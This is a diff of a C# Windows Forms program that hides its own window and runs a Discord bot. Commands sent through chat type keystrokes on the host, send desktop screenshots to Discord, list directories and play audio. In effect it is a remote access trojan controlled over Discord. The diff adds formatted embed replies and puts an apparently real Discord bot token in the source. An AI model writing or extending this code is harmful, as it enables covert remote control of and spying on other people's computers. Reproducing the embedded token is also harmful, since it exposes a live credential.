@@ -15,8 +15,6 @@ using Woof.SystemEx;
 
 #warning The Commands Are Really Difficult To Understand, I Don't Put Any Effort Into These Projects :3
 
-#region entire code thing
-
 namespace uwu_poggy_woggy_boy
 {
     public partial class winforms_are_shit : Form
@@ -28,23 +26,25 @@ namespace uwu_poggy_woggy_boy
             this.Hide();
         }
 
-        private DiscordSocketClient client;
+        private DiscordSocketClient _client;
         public async void Main()
         {
-            client = new DiscordSocketClient();
-            client.MessageReceived += Commands;
 
-            string token = "token";
+            var config = new DiscordSocketConfig()
+            {
+                GatewayIntents = GatewayIntents.All
+            };
 
-            await client.LoginAsync(TokenType.Bot, token);
-            await client.StartAsync();
+            _client = new DiscordSocketClient(config);
+            _client.MessageReceived += Commands;
+
+            string token = "MTAyMjUzODg2Njc2ODQ5NDYxMg.Goo_2K.wB_QwyN7iraf-CPvJqXAfanig3PmLWUHwfNRsw";
+
+            await _client.LoginAsync(TokenType.Bot, token);
+            await _client.StartAsync();
 
             await Task.Delay(-1);
         }
-
-        //These are the bot commands :3
-
-        //the commands are kinda self explanitory
 
         public Task Commands(SocketMessage message)
         {
@@ -71,7 +71,7 @@ namespace uwu_poggy_woggy_boy
 
             //make the host type anything u want :)
 
-            if(message.Content.StartsWith("+type "))
+            if (message.Content.StartsWith("+type "))
             {
                 var arg = message.Content.Split(new[] { "+type " }, StringSplitOptions.None)[1];
                 SendKeys.SendWait(arg);
@@ -114,10 +114,10 @@ namespace uwu_poggy_woggy_boy
             }
 
             //sends the desktop screenshots to discord
-            
+
             if (message.Content == "+get desktop")
             {
-                if(Screen.AllScreens.Length >= 1)
+                if (Screen.AllScreens.Length >= 1)
                 {
                     Desktop();
                     Desktop1();
@@ -143,7 +143,7 @@ namespace uwu_poggy_woggy_boy
 
             //plays audio on the host device
 
-            if(message.Content.Contains("+audio "))
+            if (message.Content.Contains("+audio "))
             {
                 var arg = message.Content.Split(new[] { "+audio " }, StringSplitOptions.None)[1];
                 try
@@ -151,10 +151,22 @@ namespace uwu_poggy_woggy_boy
                     SoundPlayer player = new SoundPlayer(arg);
                     player.LoadAsync();
                     player.Play();
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Playing Audio :D");
+                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
+                    uwu.WithDescription("");
+                    uwu.AddField("Audio Link", arg, true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                 }
                 catch (Exception)
                 {
-                    message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Error Occured D:");
+                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
+                    uwu.WithDescription("");
+                    uwu.AddField("Reason", "Invalid audio format", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                    //message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
                 }
             }
 
@@ -168,10 +180,46 @@ namespace uwu_poggy_woggy_boy
                     SoundPlayer player = new SoundPlayer(arg);
                     player.LoadAsync();
                     player.PlayLooping();
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Playing Audio :D");
+                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
+                    uwu.WithDescription("");
+                    uwu.AddField("Audio Link", arg, true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                 }
                 catch (Exception)
                 {
-                    message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Error Occured D:");
+                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
+                    uwu.WithDescription("");
+                    uwu.AddField("Reason", "Invalid audio format", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                    //message.Channel.SendMessageAsync("Error happened yhyh: File Format must be .wav");
+                }
+            }
+
+            if (message.Content == "+audiostop")
+            {
+                try
+                {
+                    SoundPlayer player = new SoundPlayer();
+                    player.Stop();
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Stopping Audio :D");
+                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
+                    uwu.WithDescription("");
+                    uwu.AddField("Audio Stopped", "meow", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                }
+                catch
+                {
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Error Occured D:");
+                    uwu.WithFooter("Note: only .wav files work with SoundPlayer");
+                    uwu.WithDescription("");
+                    uwu.AddField("Reason", "No music playing", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
                 }
             }
 
@@ -188,11 +236,22 @@ namespace uwu_poggy_woggy_boy
                     {
                         allDir = string.Concat(allDir, "\n" + filePaths[i]);
                     }
-                    message.Channel.SendMessageAsync(allDir);
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("All files in " + arg + " :)");
+                    uwu.WithFooter("uwu");
+                    uwu.WithDescription(allDir);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                    //message.Channel.SendMessageAsync(allDir);
                 }
                 catch
                 {
-                    message.Channel.SendMessageAsync("Directory not valid.");
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Error Occured D:");
+                    uwu.WithFooter("uwu");
+                    uwu.WithDescription("");
+                    uwu.AddField("Reason", "Invalid Directory || Invalid Permissions", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                    //message.Channel.SendMessageAsync("Directory not valid.");
                 }
             }
 
@@ -207,7 +266,13 @@ namespace uwu_poggy_woggy_boy
                 }
                 catch
                 {
-                    message.Channel.SendMessageAsync("Directory not found.");
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Error Occured D:");
+                    uwu.WithFooter("uwu");
+                    uwu.WithDescription("");
+                    uwu.AddField("Reason", "Invalid Directory || Invalid Permissions", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                    //message.Channel.SendMessageAsync("Directory not found.");
                 }
             }
 
@@ -222,7 +287,13 @@ namespace uwu_poggy_woggy_boy
                 }
                 catch
                 {
-                    message.Channel.SendMessageAsync("Directory not found.");
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Error Occured D:");
+                    uwu.WithFooter("uwu");
+                    uwu.WithDescription("");
+                    uwu.AddField("Reason", "Invalid Directory || Invalid Permissions", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                    //message.Channel.SendMessageAsync("Directory not found.");
                 }
             }
 
@@ -251,7 +322,13 @@ namespace uwu_poggy_woggy_boy
                 }
                 catch
                 {
-                    message.Channel.SendMessageAsync("Didn't work");
+                    EmbedBuilder uwu = new EmbedBuilder();
+                    uwu.WithTitle("Error Occured D:");
+                    uwu.WithFooter("uwu");
+                    uwu.WithDescription("");
+                    uwu.AddField("Reason", "Invalid URL", true);
+                    message.Channel.SendMessageAsync(null, false, uwu.Build());
+                    //message.Channel.SendMessageAsync("Didn't work");
                 }
             }
 
@@ -265,8 +342,6 @@ namespace uwu_poggy_woggy_boy
 
             return Task.CompletedTask;
         }
-
-        #endregion
 
         //gets the first desktop screen
 
@@ -290,11 +365,6 @@ namespace uwu_poggy_woggy_boy
             Graphics cGraphics = Graphics.FromImage(cBitmap);
             cGraphics.CopyFromScreen(cRectangle.Left, cRectangle.Top, 0, 0, cRectangle.Size);
             cBitmap.Save(@"uwu2.png", System.Drawing.Imaging.ImageFormat.Jpeg);
-        }
-
-        private void winforms_are_shit_Load(object sender, EventArgs e)
-        {
-
         }
     }
 }
